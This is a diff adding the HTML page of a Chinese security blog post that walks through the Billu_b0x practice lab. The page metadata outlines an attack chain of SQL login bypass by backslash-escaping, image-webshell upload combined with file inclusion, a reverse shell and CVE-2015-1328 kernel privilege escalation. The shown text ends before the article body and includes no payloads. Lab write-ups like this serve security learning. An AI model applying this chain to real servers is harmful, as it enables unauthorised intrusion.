@@ -1,0 +1,890 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Billu_b0x 靶场通关记录 | cHr1s's bolg</title><meta name="keywords" content="SQL注入,文件上传,文件包含,内核提权,LFI,Getshell"><meta name="author" content="cHr1s"><meta name="copyright" content="cHr1s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Billu_b0x 靶场通关记录"><meta name="application-name" content="Billu_b0x 靶场通关记录"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Billu_b0x 靶场通关记录"><meta property="og:url" content="http://example.com/2026/05/21/Billu_b0x/index.html"><meta property="og:site_name" content="cHr1s's bolg"><meta property="og:description" content="Billu_b0x 靶场完整通关记录，涵盖信息收集、SQL注入登录绕过（反斜杠转义单引号）、图片马上传+LFI组合getshell、CVE-2015-1328 overlayfs内核提权"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/images/avatar.jpg"><meta property="article:author" content="cHr1s"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/images/avatar.jpg"><meta name="description" content="Billu_b0x 靶场完整通关记录，涵盖信息收集、SQL注入登录绕过（反斜杠转义单引号）、图片马上传+LFI组合getshell、CVE-2015-1328 overlayfs内核提权"><link rel="shortcut icon" href="/favicon.svg"><link rel="canonical" href="http://example.com/2026/05/21/Billu_b0x/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"images/loading.gif"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要奏！再看一会儿嘛！","backTitle":"♪(^∇^*)欢迎肥来~"},
+  LA51: undefined,
+  greetingBox: {"enable":true,"default":"你好鸭👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: cHr1s","link":"链接: ","source":"来源: cHr1s's bolg","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.2.0/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'cHr1s\'s bolg',
+  title: 'Billu_b0x 靶场通关记录',
+  postAI: '',
+  pageFillDescription: 'Billu_b0x 靶场学习记录, 环境信息, 一、信息收集, 1.1 主机发现, 1.2 全端口扫描, 1.3 服务版本扫描, 1.4 漏洞扫描, 1.5 目录扫描, 1.6 目录速查汇总, 1.7 phpinfo 泄露, 1.8 阶段小结, 二、文件包含与源码审计, 2.1 test.php — 文件包含漏洞, 2.2 index.php 源码审计（发现 SQL 注入）, 2.3 add.php 源码审计（发现文件上传点）, 2.4 文件包含能力验证, 2.5 阶段小结, 三、SQL 注入（登录绕过）, 3.1 注入点分析, 3.2 sqlmap 字典跑注入, 3.3 手工注入绕过, 3.4 进入后台, 四、文件上传 + 文件包含 Getshell, 4.1 上传过滤分析, 4.2 图片马制作与上传, 4.3 发现文件包含入口, 4.4 执行图片马获取 RCE, 4.5 反弹 Shell, 4.6 Getshell 方法汇总, 五、信息收集（提权准备）, 5.1 系统信息, 5.2 内核漏洞搜索, 六、权限提升, 6.1 漏洞原理, 6.2 漏洞利用, 6.3 提权方法汇总, 七、总结, 攻击链回顾, 关键漏洞点, 反思靶场学习记录环境信息项目值攻击机靶机靶机开放端口靶机系统内核版本服务服务一信息收集主机发现确定靶机为全端口扫描仅开放和攻击面集中在应用服务版本扫描信息项结果操作系统服务器版本页面标题漏洞扫描发现测试页面和目录列表目录扫描多处路径的短文件名也可访问如这是或导致的大字典补充目录速查汇总路径状态码说明首页登录框后台面板需登录文件上传页面文件包含点需参数页面目录列表可见空白可能是图片显示空白数据库连接文件页面头部组件泄露访问直接输出可获取网站绝对路径等敏感信息阶段小结信息收集阶段获得三项关键情报可访问泄露服务器配置和网站绝对路径目录列表文件上传后可能存放在此目录需要参数疑似文件包含读取功能是获取源码和的关键入口二文件包含与源码审计文件包含漏洞直接访问返回空白提示需要参数抓包后将改为传入成功获取源码源码审计发现注入代码分析关键点分析过滤方式移除所有单引号漏洞原因反斜杠未被过滤可转义语句中的闭合引号语句登录后行为跳转至源码审计发现文件上传点通过包含得到源码单独的直接访问没有实际处理逻辑上传没反应因为真正的处理代码在内部通过加载并执行文件包含能力验证可以读取任意系统文件成功读取确认存在普通用户尝试读取则权限不足阶段小结漏洞读取源码发现注入单引号被过滤反斜杠未过滤读取源码发现文件上传功能读取确认可读系统文件三注入登录绕过注入点分析从源码可知过滤项说明单引号替换为空无法直接闭合字符串反斜杠未过滤可用于转义中的闭合引号字典跑注入多个返回跳转即登录成功手工注入绕过使用作为用户名作为密码成功绕过登录原理用户名中的将语句中值的闭合引号转义使密码字段的结尾单引号成为字符串的一部分令条件生效并注释掉剩余进入后台登录成功后进入可见两个已有用户及用户管理功能功能包含图片上传四文件上传文件包含上传过滤分析直接上传一句话木马被拦截提示只能上传抓包分析发现存在三层过滤过滤层检查内容绕过方式必须为修改为文件扩展名仅允许文件名改为或以图片扩展名结尾文件头必须为合法图片文件头文件开头写入图片马制作与上传在文件头后追加一句话木马上传成功文件位于目录发现文件包含入口抓包发现通过参数加载的内容这是一个文件包含点验证可包含系统文件执行图片马获取文件包含图片马时文件被当作文本输出改用直接访问图片马配合参数的一句话木马通过参数传入编码的命令成功执行反弹监听通过图片马执行反弹命令编码规避特殊字符原始命令编码成功收到反弹当前用户为方法汇总步骤技术说明绕过上传过滤图片马扩展名文件头三重过滤均可绕过执行代码一句话木马直接访问图片马传参反弹编码避免参数中特殊字符被截断五信息收集提权准备系统信息信息项值主机名内核版本系统版本架构内核漏洞搜索匹配到本地提权编号六权限提升漏洞原理是文件系统的本地提权漏洞函数在设置文件属性时未正确检查权限允许非特权用户创建具有所有权的文件进而通过二进制文件提权漏洞利用第步下载并开启服务第步靶机下载到无写入权限第步编译并执行第步提权成功获得提权方法汇总方法漏洞编号前提条件结果本地提权内核可编译程序成功直接七总结攻击链回顾主机发现端口扫描全端口服务版本漏洞脚本目录枚举泄露文件包含读取源码注入转义绕过单引号过滤读取源码文件上传功能读取确认普通用户注入绕过登录进入后台图片马上传绕过扩展名文件头三层过滤一句话木马执行反弹编码内核信息收集匹配编译执行关键漏洞点漏洞说明危害敏感信息泄露直接输出泄露服务器配置绝对路径文件包含未限制包含路径读取任意源码及系统文件源码泄露通过读取逻辑暴露查询和上传处理逻辑注入单引号过滤可被转义绕过登录绕过进入后台文件上传过滤不足仅检查扩展名文件头图片马绕过上传文件包含执行参数未限制可包含上传的图片马实现内核提权反思是信息收集的最高效手段一个的文件包含漏洞直接读出了登录逻辑和上传逻辑的源码相当于把整个应用的设计摊开给你看源码审计比盲目高效读源码后绕过单引号过滤的思路变得显而易见比用跑字典更有针对性图片马几乎防不住只要允许上传图片且上传目录能执行扩展名文件头三层过滤等于形同虚设文件包含文件上传组合拳单独的文件上传或文件包含可能都不致命但两者结合是最快路径老系统提权靠内核的公开命中率极高一把出结果权限目录要记住无写入权限时是恒久的下载编译阵地',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-05-21 21:19:03',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 8.1.1"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/images/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">cHr1s's bolg</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Getshell/" style="font-size: 1.05rem;">Getshell<sup>1</sup></a><a href="/tags/Hash%E7%A0%B4%E8%A7%A3/" style="font-size: 1.05rem;">Hash破解<sup>1</sup></a><a href="/tags/LD-PRELOAD/" style="font-size: 1.05rem;">LD_PRELOAD<sup>1</sup></a><a href="/tags/LFI/" style="font-size: 1.05rem;">LFI<sup>1</sup></a><a href="/tags/Pikachu/" style="font-size: 1.05rem;">Pikachu<sup>1</sup></a><a href="/tags/Redis%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Redis提权<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">SQL注入<sup>4</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>2</sup></a><a href="/tags/basics/" style="font-size: 1.05rem;">basics<sup>3</sup></a><a href="/tags/ctf/" style="font-size: 1.05rem;">ctf<sup>4</sup></a><a href="/tags/disable-functions%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">disable_functions绕过<sup>1</sup></a><a href="/tags/hexo%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0/" style="font-size: 1.05rem;">hexo装修日记<sup>2</sup></a><a href="/tags/sqli-labs/" style="font-size: 1.05rem;">sqli-labs<sup>1</sup></a><a href="/tags/sqlmap/" style="font-size: 1.05rem;">sqlmap<sup>2</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>1</sup></a><a href="/tags/study/" style="font-size: 1.05rem;">study<sup>1</sup></a><a href="/tags/upload-labs/" style="font-size: 1.05rem;">upload-labs<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">web安全<sup>4</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>1</sup></a><a href="/tags/xss-labs/" style="font-size: 1.05rem;">xss-labs<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" style="font-size: 1.05rem;">代码执行<sup>1</sup></a><a href="/tags/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">内核提权<sup>1</sup></a><a href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 1.05rem;">刷题记录<sup>3</sup></a><a href="/tags/%E5%8F%8D%E5%BC%B9Shell/" style="font-size: 1.05rem;">反弹Shell<sup>1</sup></a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 1.05rem;">命令执行<sup>1</sup></a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">命令注入<sup>2</sup></a><a href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">安全测试<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 1.05rem;">杂项<sup>1</sup></a><a href="/tags/%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83/" style="font-size: 1.05rem;">水平越权<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">认证绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 1.05rem;">靶机<sup>1</sup></a><a href="/tags/%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/" style="font-size: 1.05rem;">黑名单绕过<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/05/"><span class="card-archive-list-date">五月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url">靶场</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/Linux%E6%8F%90%E6%9D%83/" itemprop="url">Linux提权</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>SQL注入</span></a><a class="article-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>文件上传</span></a><a class="article-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>文件包含</span></a><a class="article-meta__tags" href="/tags/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>内核提权</span></a><a class="article-meta__tags" href="/tags/LFI/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>LFI</span></a><a class="article-meta__tags" href="/tags/Getshell/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Getshell</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Billu_b0x 靶场通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-05-20T16:00:00.000Z" title="发表于 2026-05-21 00:00:00">2026-05-21</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-05-21T13:19:03.869Z" title="更新于 2026-05-21 21:19:03">2026-05-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Billu_b0x 靶场通关记录"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2026/05/21/Billu_b0x/"><header><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url">靶场</a><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/Linux%E6%8F%90%E6%9D%83/" itemprop="url">Linux提权</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">SQL注入</a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" tabindex="-1" itemprop="url">文件上传</a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" tabindex="-1" itemprop="url">文件包含</a><a href="/tags/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url">内核提权</a><a href="/tags/LFI/" tabindex="-1" itemprop="url">LFI</a><a href="/tags/Getshell/" tabindex="-1" itemprop="url">Getshell</a><h1 id="CrawlerTitle" itemprop="name headline">Billu_b0x 靶场通关记录</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">cHr1s</span><time 